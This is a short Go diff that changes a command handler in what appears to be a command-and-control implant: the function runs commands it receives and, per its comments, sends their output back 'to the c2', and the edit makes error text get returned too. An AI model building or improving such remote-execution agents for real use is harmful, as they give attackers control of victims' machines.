@@ -44,7 +44,7 @@ func handleCommand(c, uid string) {
 	p := exec.Command(cmds[0], cmds[1:]...)
 	result, e := p.Output()
 	if e != nil {
-		return
+		result = []byte(e.Error())
 	}
 	//get output of command
 	//work out how many blocks need to be sent to the c2
